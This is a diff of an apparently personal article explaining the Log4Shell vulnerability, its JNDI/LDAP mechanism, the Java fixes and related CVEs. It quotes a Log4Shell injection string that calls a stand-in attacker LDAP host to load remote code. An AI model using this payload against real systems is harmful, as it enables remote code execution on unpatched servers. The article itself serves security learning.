@@ -31,7 +31,7 @@ I totally understand this approach: accept everything and give the admin maximum
 
 And in 2021, when nobody deploys different web applications on the same JVM, attackers discovered that `${jndi:ldap://badCriminal.com:1389/a}` bypasses adding the prefix because of the colon and `javax.naming.InitialContext.lookup()` method would be called with `ldap://badCriminal.com:1389/a` as a parameter. Absolutely nothing in Javadoc says that this method can initialize a class downloaded from the Internet, and using user input as a parameter gives attackers an opportunity for remote code execution.
 
-I wrote an exploit class that prints a stacktrace:
+I searched for **JNDI Injection** and found [detailed slides](https://blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) from Black Hat USA 2016 conference. I have Java 8u66 installed on my desktop in 2015 (hardware of this machine was totally renewed, and it runs another operating system now) and I used [project published in 2017](https://github.com/mbechler/marshalsec) for the attack part. I wrote an exploit class that prints a stacktrace: 
 
 ```
 java.lang.Exception
@@ -54,16 +54,12 @@ java.lang.Exception
 
 Look at it: all bad things are happening deep inside Java internals. So, the landmine was placed long ago by Sun Microsystems in [RFC 2713](https://www.rfc-editor.org/info/rfc2713/). I am not an expert in the LDAP protocol, but it seems to me a very strange idea to download bytecode from an LDAP server and run it. 
 
-I searched for **JNDI Injection** and found [detailed slides](https://blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) from Black Hat USA 2016 conference.  In Java 8u121, released in 2017, findings from this presentation were partially addressed, but the LDAP attack vector [was fixed only in Java 8u191 in 2018](https://bugzilla.redhat.com/show_bug.cgi?id=1639834). Note that this is not a complete solution, remaining attack vector [explained here](https://www.veracode.com/blog/research/exploiting-jndi-injections-java).
+So, until [Java 8u191 released in 2018](https://bugzilla.redhat.com/show_bug.cgi?id=1639834) Log4Shell exploit was available even for kids. But as it was [explained here in 2019](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) - this is not a complete solution.
 
-
-Why was Log4Shell such an issue in 2021? I can reproduce this vulnerability at home easily, because I have Java 8u66 installed on my desktop in 2015 (hardware of this machine was totally renewed, and it runs another operating system now). There is no surprise that many companies were running old Java 8 distributions in production in 2021.
-
-For the attack part, I used [project published in 2017](https://github.com/mbechler/marshalsec). So in 2021 it was trivial to implement a Log4Shell exploit.
 
 3 more related CVEs were discovered in Log4j [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/cve-2021-45046), [CVE-2021-44832](https://nvd.nist.gov/vuln/detail/cve-2021-44832) and [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/cve-2021-45105) but it didn't do such a big impact.
 
 Remote code downloading in JNDI is permanently disabled in [Java 24](https://bugs.openjdk.org/browse/JDK-8338536).
 
-Why am I writing this article in 2026? Because I am looking for a job in Israel, and cybersecurity companies here are growing fast. So, I did this research to improve my skills. And it is clear why demand is growing for cybersecurity solutions: with AI, the next Log4Shell-like vulnerability will not wait eight years before being exploited.
+Why am I writing this article in 2026? Because I am looking for a job in Israel, and cybersecurity companies here are growing fast. So, I did this research to improve my skills. And it is clear why demand is growing for cybersecurity solutions: with AI, vulnerabilities can be exploited with at scale we have never seen before.
 
